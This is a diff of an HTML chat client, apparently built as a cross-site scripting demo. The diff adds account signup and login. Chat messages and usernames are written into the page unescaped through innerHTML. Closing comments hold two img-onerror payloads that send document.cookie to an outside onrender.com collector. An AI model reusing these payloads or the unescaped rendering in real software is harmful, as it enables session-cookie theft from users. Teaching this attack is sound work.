@@ -1,137 +1,249 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Live Chat App (XSS Demo)</title>
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles.css" />
     <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
+  </head>
 
-</head>
-
-<body>
-    <div class="step1">
-        <h1>Group Chat (XSS)</h1>
-        <h4>Enter your username to continue</h4>
-        <div class="input-container">
-            <div>
-                <input type="text" id="username" placeholder="Username" required class="input-username">
-            </div>
-            <div>
-                <button class="continue-btn" id="username-submit">Continue</button>
-            </div>
+  <body>
+    <div class="step-signup">
+      <h1>Group Chat (XSS)</h1>
+      <h4>Create an account</h4>
+      <div class="input-container">
+        <div>
+          <input type="text" id="signup-name" placeholder="Full Name" required class="input-username" />
         </div>
+        <div>
+          <input type="text" id="signup-username" placeholder="Username" required class="input-username" />
+        </div>
+        <div>
+          <input type="password" id="signup-password" placeholder="Password" required class="input-username" />
+        </div>
+        <div>
+          <input type="password" id="signup-password-confirm" placeholder="Repeat Password" required class="input-username" />
+        </div>
+        <div class="login-error" id="signup-error"></div>
+        <div>
+          <button class="continue-btn" id="signup-submit">Sign Up</button>
+        </div>
+        <p class="auth-switch">Already have an account? <a href="#" id="show-login">Login</a></p>
+      </div>
+    </div>
+
+    <div class="step-login" style="display: none;">
+      <h1>Group Chat (XSS)</h1>
+      <h4>Login to continue</h4>
+      <div class="input-container">
+        <div>
+          <input type="text" id="login-username" placeholder="Username" required class="input-username" />
+        </div>
+        <div>
+          <input type="password" id="login-password" placeholder="Password" required class="input-username" />
+        </div>
+        <div class="login-error" id="login-error"></div>
+        <div>
+          <button class="continue-btn" id="login-submit">Login</button>
+        </div>
+        <p class="auth-switch">Don't have an account? <a href="#" id="show-signup">Sign Up</a></p>
+      </div>
     </div>
     <div class="step2">
+      <div class="top-bar">
         <h1>Simple Live Chat App (XSS Demo)</h1>
+        <div class="top-bar-right">
+          <button class="logout-btn" id="logout-btn">Logout</button>
+          <div class="logged-in-user" id="logged-in-user"></div>
+        </div>
+      </div>
 
-        <div id="messages"></div>
+      <div id="messages"></div>
 
-        <form id="chat-form">
-            <!-- <div>
+      <form id="chat-form">
+        <!-- <div>
                 <input type="text" id="username" placeholder="Username" required class="input-username">
             </div> -->
-            <div class="send-message-wrapper">
-                <textarea id="message" placeholder="Type your message" required></textarea>
-                <button type="submit" class="submit-btn">Send</button>
-            </div>
-        </form>
+        <div class="send-message-wrapper">
+          <textarea
+            id="message"
+            placeholder="Type your message"
+            required
+          ></textarea>
+          <button type="submit" class="submit-btn">Send</button>
+        </div>
+      </form>
     </div>
 
     <script>
-        // Connect to Socket.IO server
-        function initSocket(){
-            // Handle incoming chat messages
-            const socket = io();
-            socket.on('chat messages', (messages) => {
-                const messagesContainer = document.getElementById('messages');
-                messagesContainer.innerHTML = '';
-                messages.forEach(msg => {
-                    const msgElement = document.createElement('div');
-                    msgElement.classList.add('message');
-                    if (msg.username === window.username) {
-                        msgElement.classList.add('self-message');
-                    }
-                    else {
-                        msgElement.classList.add('group-message');
-                    }
-                    msgElement.innerHTML = `<div class="msg-user">${msg.username[0]}</div> <div class="msg-msg"><div class="msg-username">${msg.username}</div><div>${msg.message}</div> </div>`;
-                    messagesContainer.appendChild(msgElement);
-                });
-                window.scrollTo(0, document.body.scrollHeight);
-            });
+      function showStep(step) {
+        document.querySelector(".step-signup").style.display = step === "signup" ? "" : "none";
+        document.querySelector(".step-login").style.display = step === "login" ? "" : "none";
+        document.querySelector(".step2").style.display = step === "chat" ? "block" : "none";
+      }
 
-            // Handle new messages
-            socket.on('new message', (msg) => {
-                const messagesContainer = document.getElementById('messages');
-                const msgElement = document.createElement('div');
-                msgElement.classList.add('message');
-                // msgElement.innerHTML = `<strong>${msg.username}</strong>: ${msg.message}`;
-                if (msg.username === window.username) {
-                    msgElement.classList.add('self-message');
-                }
-                else {
-                    msgElement.classList.add('group-message');
-                }
-                msgElement.innerHTML = `<div class="msg-user">${msg.username[0]}</div> <div class="msg-msg"><div class="msg-username">${msg.username}</div><div>${msg.message}</div> </div>`;
-                messagesContainer.appendChild(msgElement);
-                window.scrollTo(0, document.body.scrollHeight);
-            });
+      // Toggle between signup and login
+      document.getElementById("show-login").addEventListener("click", function (e) {
+        e.preventDefault();
+        showStep("login");
+      });
+      document.getElementById("show-signup").addEventListener("click", function (e) {
+        e.preventDefault();
+        showStep("signup");
+      });
 
-            // Handle form submission
-            document.getElementById('chat-form').addEventListener('submit', function (e) {
-                e.preventDefault();
-                const username = window.username;
-                const message = document.getElementById('message').value;
-
-                // Send the new message to the server
-                socket.emit('new message', { username, message });
-
-                // Clear the message input
-                document.getElementById('message').value = '';
-            });
-        }
-
-        
-
-        document.getElementById('username-submit').addEventListener('click', function () {
-            const username = document.getElementById('username').value;
-            
-            if (username) {
-                fetch('/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username })
-                })
-                .then(res => res.json())
-                .then(() => {
-                    document.querySelector('.step1').style.display = 'none';
-                    document.querySelector('.step2').style.display = 'block';
-                    window.username = username;
-                    initSocket();
-                })
-                .catch(err => console.error('Login failed:', err));
+      // Connect to Socket.IO server
+      function initSocket() {
+        const socket = io();
+        socket.on("chat messages", (messages) => {
+          const messagesContainer = document.getElementById("messages");
+          messagesContainer.innerHTML = "";
+          messages.forEach((msg) => {
+            const msgElement = document.createElement("div");
+            msgElement.classList.add("message");
+            if (msg.username === window.username) {
+              msgElement.classList.add("self-message");
+            } else {
+              msgElement.classList.add("group-message");
             }
-            else {
-                alert('Please enter a username');
-            }
+            msgElement.innerHTML = `<div class="msg-user">${msg.username[0]}</div> <div class="msg-msg"><div class="msg-username">${msg.username}</div><div>${msg.message}</div> </div>`;
+            messagesContainer.appendChild(msgElement);
+          });
+          window.scrollTo(0, document.body.scrollHeight);
         });
 
-        // Auto-login if session exists
-        fetch('/me')
-            .then(res => {
-                if (res.ok) return res.json();
-                throw new Error('Not logged in');
-            })
-            .then(data => {
-                document.querySelector('.step1').style.display = 'none';
-                document.querySelector('.step2').style.display = 'block';
-                window.username = data.username;
-                initSocket();
-            })
-            .catch(() => {});
-    </script>
-</body>
+        socket.on("new message", (msg) => {
+          const messagesContainer = document.getElementById("messages");
+          const msgElement = document.createElement("div");
+          msgElement.classList.add("message");
+          if (msg.username === window.username) {
+            msgElement.classList.add("self-message");
+          } else {
+            msgElement.classList.add("group-message");
+          }
+          msgElement.innerHTML = `<div class="msg-user">${msg.username[0]}</div> <div class="msg-msg"><div class="msg-username">${msg.username}</div><div>${msg.message}</div> </div>`;
+          messagesContainer.appendChild(msgElement);
+          window.scrollTo(0, document.body.scrollHeight);
+        });
 
+        document
+          .getElementById("chat-form")
+          .addEventListener("submit", function (e) {
+            e.preventDefault();
+            const username = window.username;
+            const message = document.getElementById("message").value;
+            socket.emit("new message", { username, message });
+            document.getElementById("message").value = "";
+          });
+      }
+
+      function enterChat(username) {
+        window.username = username;
+        document.getElementById("logged-in-user").textContent = username;
+        showStep("chat");
+        initSocket();
+      }
+
+      // Logout
+      document
+        .getElementById("logout-btn")
+        .addEventListener("click", function () {
+          fetch("/logout", { method: "POST" })
+            .then(() => {
+              window.username = null;
+              document.getElementById("messages").innerHTML = "";
+              showStep("login");
+            })
+            .catch((err) => console.error("Logout failed:", err));
+        });
+
+      // Signup
+      document
+        .getElementById("signup-submit")
+        .addEventListener("click", function () {
+          const name = document.getElementById("signup-name").value;
+          const username = document.getElementById("signup-username").value;
+          const password = document.getElementById("signup-password").value;
+          const confirmPassword = document.getElementById("signup-password-confirm").value;
+          const errorEl = document.getElementById("signup-error");
+          errorEl.textContent = "";
+
+          if (!name || !username || !password || !confirmPassword) {
+            errorEl.textContent = "All fields are required";
+            return;
+          }
+          if (password !== confirmPassword) {
+            errorEl.textContent = "Passwords do not match";
+            return;
+          }
+
+          fetch("/signup", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ name, username, password }),
+          })
+            .then((res) => res.json().then((data) => ({ ok: res.ok, data })))
+            .then(({ ok, data }) => {
+              if (!ok) {
+                errorEl.textContent = data.error;
+                return;
+              }
+              showStep("login");
+            })
+            .catch((err) => {
+              errorEl.textContent = "Signup failed";
+              console.error("Signup failed:", err);
+            });
+        });
+
+      // Login
+      document
+        .getElementById("login-submit")
+        .addEventListener("click", function () {
+          const username = document.getElementById("login-username").value;
+          const password = document.getElementById("login-password").value;
+          const errorEl = document.getElementById("login-error");
+          errorEl.textContent = "";
+
+          if (!username || !password) {
+            errorEl.textContent = "Please enter username and password";
+            return;
+          }
+
+          fetch("/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password }),
+          })
+            .then((res) => res.json().then((data) => ({ ok: res.ok, data })))
+            .then(({ ok, data }) => {
+              if (!ok) {
+                errorEl.textContent = data.error;
+                return;
+              }
+              enterChat(username);
+            })
+            .catch((err) => {
+              errorEl.textContent = "Login failed";
+              console.error("Login failed:", err);
+            });
+        });
+
+      // Auto-login if session exists
+      fetch("/me")
+        .then((res) => {
+          if (res.ok) return res.json();
+          throw new Error("Not logged in");
+        })
+        .then((data) => enterChat(data.username))
+        .catch(() => {});
+    </script>
+  </body>
 </html>
+
+<!-- https://group-chat-xss-node.onrender.com/ -->
+<!-- https://simple-express-app-2i93.onrender.com/ -->
+
+<!-- <img src=x onerror="fetch('https://simple-express-app-2i93.onrender.com/api/save?data='+document.cookie)"> -->
+<!-- <img src=x onerror="fetch('https://simple-express-app-2i93.onrender.com/api/save/?data='+document.cookie)"> -->
